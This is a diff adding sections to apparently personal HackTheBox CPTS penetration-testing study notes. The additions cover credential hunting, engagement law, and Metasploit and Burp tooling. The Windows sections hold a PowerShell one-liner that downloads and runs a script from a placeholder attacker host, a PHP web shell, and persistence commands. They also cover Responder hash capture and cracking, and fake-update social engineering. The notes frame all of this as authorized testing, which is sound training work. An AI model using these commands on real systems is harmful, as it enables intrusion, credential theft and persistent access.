@@ -211,6 +211,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
     - [Thick Client Applications](#thick-client-applications)
     - [Web Mass Assignment](#web-mass-assignment)
     - [Application Hardening](#application-hardening)
+  - [Applications Connecting to Services](#applications-connecting-to-services)
 - [13. Linux Privilege Escalation](#13-linux-privilege-escalation)
   - [Quick Checks](#quick-checks)
   - [Information Gathering](#information-gathering)
@@ -249,6 +250,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Skills Assessment](#skills-assessment)
   - [References](#references)
 - [14. Penetration Testing Process](#14-penetration-testing-process)
+  - [Laws & Regulations](#laws--regulations)
   - [Engagement Stages](#engagement-stages)
     - [Pre-Engagement](#pre-engagement)
     - [Information Gathering](#information-gathering-1)
@@ -271,6 +273,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Scoring and References](#scoring-and-references)
   - [Nessus](#nessus)
   - [OpenVAS / GVM](#openvas--gvm)
+  - [Nessus Advanced Settings & Export](#nessus-advanced-settings--export)
   - [Reporting](#reporting)
 - [17. Using the Metasploit Framework](#17-using-the-metasploit-framework)
   - [MSFconsole Basics](#msfconsole-basics)
@@ -279,6 +282,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Database and Workspaces](#database-and-workspaces)
   - [Sessions and Jobs](#sessions-and-jobs)
   - [Meterpreter](#meterpreter)
+  - [Plugins & Mixins](#plugins--mixins)
   - [Writing and Importing Modules](#writing-and-importing-modules)
   - [MSFvenom and Handlers](#msfvenom-and-handlers)
   - [Wrapping and Packing](#wrapping-and-packing)
@@ -286,6 +290,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
 - [18. Using Web Proxies](#18-using-web-proxies)
   - [Proxy Setup](#proxy-setup)
   - [Core Workflow](#core-workflow)
+  - [Burp/ZAP Feature Map](#burpzap-feature-map)
   - [Proxying Command-Line Tools](#proxying-command-line-tools)
   - [Useful Burp/ZAP Features](#useful-burpzap-features)
 - [19. Command Injections](#19-command-injections)
@@ -356,6 +361,8 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Vulnerable Services](#vulnerable-services-1)
   - [DLL Injection and Hijacking](#dll-injection-and-hijacking)
   - [Credential Theft](#credential-theft)
+  - [Interacting with Users](#interacting-with-users)
+  - [Pillaging](#pillaging)
   - [Restricted Environments and Additional Techniques](#restricted-environments-and-additional-techniques)
     - [Citrix Breakout](#citrix-breakout)
     - [Scheduled Tasks](#scheduled-tasks)
@@ -374,6 +381,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Initial Access](#initial-access)
   - [Internal Information Gathering](#internal-information-gathering)
   - [Lateral Movement and AD Compromise](#lateral-movement-and-ad-compromise)
+  - [Persistence & Post-Exploitation](#persistence--post-exploitation)
   - [Post-Exploitation and Closeout](#post-exploitation-and-closeout)
   - [Engagement Checklist](#engagement-checklist)
 - [29. Useful Resources](#29-useful-resources)
@@ -3886,6 +3894,29 @@ Test registration, profile update, password reset, and API endpoints. Use Burp R
 - Disable directory listing and unnecessary HTTP methods.
 - Monitor application logs and upload directories.
 
+### Applications Connecting to Services
+
+Many applications connect to databases, LDAP/AD, SMTP, caching, or internal APIs. These connections are often configured with reusable credentials or over-privileged accounts.
+
+- Jenkins — LDAP/AD, SMTP, cloud credentials, build secrets.
+- GitLab — PostgreSQL, Redis, SMTP, object storage.
+- Tomcat — JDBC realm, JNDI resources, manager accounts.
+- Splunk — LDAP, indexer connections, app secrets.
+- osTicket — MySQL, SMTP, help-desk integrations.
+- WordPress/Joomla/Drupal — database credentials in config files.
+
+```bash
+# Look for configuration and environment files
+grep -RniE "password|passwd|secret|token|api[_-]?key" /var/www /opt /etc 2>/dev/null
+find / -name "*.env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null
+
+# Check exposed admin interfaces and default credentials
+curl -s http://<TARGET>/jenkins/
+curl -s http://<TARGET>/gitlab/
+```
+
+Test whether the application can reach internal services (SSRF), whether its service account is over-privileged, and whether configuration files are readable. Reuse discovered credentials only within the authorized scope.
+
 ## 13. Linux Privilege Escalation
 
 > Condensed from HackTheBox Academy **Linux Privilege Escalation** (module 51). This is a command-oriented reference, not a copy of the course text. Lab credentials, hashes, flags, and assessment answers are intentionally omitted — replace placeholders such as `<ATTACKER_IP>`, `<TARGET>`, `<USER>`, and `<PASSWORD>` before use.
@@ -4553,6 +4584,15 @@ The module's skills assessment is intentionally not summarized here. Complete it
 
 > Condensed from HTB Academy **Penetration Testing Process** (module 90). This is the engagement workflow and closeout checklist behind the technical sections.
 
+### Laws & Regulations
+
+- Obtain written authorization and a signed scope/RoE before testing.
+- Follow data-protection and privacy law (GDPR, CCPA, local equivalents).
+- Respect industry obligations (PCI DSS, HIPAA, ISO 27001) and client-specific policies.
+- Define data handling, storage, retention, and destruction for evidence.
+- Report critical/safety-impacting findings through the agreed escalation path.
+- Do not test third-party or out-of-scope assets without explicit permission.
+
 ### Engagement Stages
 
 ```text
@@ -4836,6 +4876,15 @@ sudo gvm-start
 python3 -m openvasreporting -i report-<ID>.xml -f xlsx
 ```
 
+### Nessus Advanced Settings & Export
+
+- Use credentialed scans where authorized (SSH/SMB/Windows credentials) to improve accuracy.
+- Tune plugin families, port ranges, and performance to avoid disruptions.
+- Review false positives and validate critical findings manually.
+- Export formats: `.nessus`, CSV, HTML, PDF; use `nessus_downloader.rb` for automation.
+- Compare scans over time to track remediation.
+- Store reports and evidence according to the engagement's retention policy.
+
 ### Reporting
 
 - Executive summary: scope, approach, risk posture, top findings.
@@ -4986,6 +5035,18 @@ msf6 > run
 meterpreter > getuid
 ```
 
+### Plugins & Mixins
+
+```text
+msf6 > ls /usr/share/metasploit-framework/plugins/
+msf6 > load nessus
+msf6 > nessus_help
+msf6 > load pentest
+msf6 > help
+```
+
+Plugins extend MSFconsole with new commands and integrations. User plugins can be placed in `~/.msf4/plugins/` and loaded with `load <name>`. Mixins are Ruby modules used when writing custom Metasploit modules.
+
 ### Writing and Importing Modules
 
 ```bash
@@ -5056,6 +5117,21 @@ ZAP: `Tools > Options > Network > Local Servers/Proxies`.
 - **Intruder / Fuzzer** — automate payload positions, wordlists, and attack types.
 - **Scanner** — active/passive checks; validate findings manually.
 - **Extensions** — install only from trusted sources.
+
+### Burp/ZAP Feature Map
+
+| Feature | Burp Suite | ZAP |
+|---|---|---|
+| Intercept requests/responses | Proxy > Intercept | Break / Proxy |
+| Repeat and edit a request | Repeater | Requester |
+| Automated fuzzing | Intruder | Fuzzer |
+| Automated scanning | Scanner | Active/Passive Scan |
+| Encode/decode | Decoder | Encoder/Decoder |
+| Compare responses | Comparer | Diff |
+| Automatic header/body changes | Match and Replace | Replacer |
+| Extensions | BApp Store | ZAP Add-ons |
+
+Use **Intercept** to inspect and modify traffic, **Repeater/Requester** for manual testing, **Intruder/Fuzzer** for payload positions and wordlists, and **Scanner** for baseline checks. Validate scanner output manually.
 
 ### Proxying Command-Line Tools
 
@@ -6157,6 +6233,52 @@ python2.7 keepass2john.py <DATABASE>.kdbx > keepass_hash
 hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
 ```
 
+### Interacting with Users
+
+Social engineering can turn a low-privileged user into an execution primitive. In authorized labs:
+
+- Send a fake update, invoice, or monitoring tool and ask the user to run it.
+- Use a signed binary or a trusted document/macro to launch your payload.
+- Capture NTLMv2 hashes with Responder when a user authenticates to a malicious share.
+
+```powershell
+IEX (iwr 'http://<ATTACKER>/update.ps1')
+```
+
+```bash
+sudo responder -w -v -I <IFACE>
+hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
+```
+
+Always obtain explicit authorization before any user-interaction testing. Do not phish real employees or external users.
+
+### Pillaging
+
+- Installed software and versions:
+  ```cmd
+  dir "C:\Program Files"
+  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Select-Object DisplayName, DisplayVersion, InstallLocation
+  Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Select-Object DisplayName, DisplayVersion, InstallLocation
+  ```
+- mRemoteNG connection files (encrypted blobs must be decrypted):
+  ```cmd
+  ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
+  ```
+- Browser cookies/history, saved RDP/VNC sessions, SSH keys, and clipboard data.
+- PowerShell history, `cmdkey /list`, PuTTY sessions, and WiFi profiles.
+- Backup tools and repositories (Restic, Veeam, Windows Backup).
+- Share and SYSVOL files containing scripts, configs, or credentials.
+
+```cmd
+cmdkey /list
+reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
+netsh wlan show profile
+```
+
+Collect only what is needed to prove impact, and store any secrets according to the engagement's data-handling rules.
+
 ### Restricted Environments and Additional Techniques
 
 #### Citrix Breakout
@@ -6380,6 +6502,45 @@ proxychains secretsdump.py <USER>@<DC> -just-dc-ntlm
 ```
 
 Use `proxychains` for every internal tool, keep a per-host log, and avoid changing the environment unless required by the scope.
+
+### Persistence & Post-Exploitation
+
+Only establish persistence when it is explicitly in scope. Common Windows/Linux mechanisms:
+
+```cmd
+:: Scheduled task
+schtasks /create /tn <NAME> /tr "<COMMAND>" /sc onlogon /ru SYSTEM
+
+:: Service
+sc create <SERVICE> binPath= "<COMMAND>" start= auto
+sc start <SERVICE>
+
+:: User startup key
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /d "<COMMAND>"
+```
+
+```bash
+# Linux SSH key persistence
+echo '<PUBLIC_KEY>' >> ~/.ssh/authorized_keys
+
+# Web shell persistence
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/<FILE>.php
+```
+
+Document every change, prefer the least invasive mechanism, and remove all persistence during cleanup:
+
+```cmd
+schtasks /delete /tn <NAME> /f
+sc delete <SERVICE>
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /f
+```
+
+```bash
+rm -f /var/www/html/<FILE>.php
+sed -i '/<PUBLIC_KEY>/d' ~/.ssh/authorized_keys
+```
+
+For post-exploitation, collect only the evidence needed to prove impact, avoid unnecessary data exfiltration, and record timestamps and hashes for the report.
 
 ### Post-Exploitation and Closeout
 
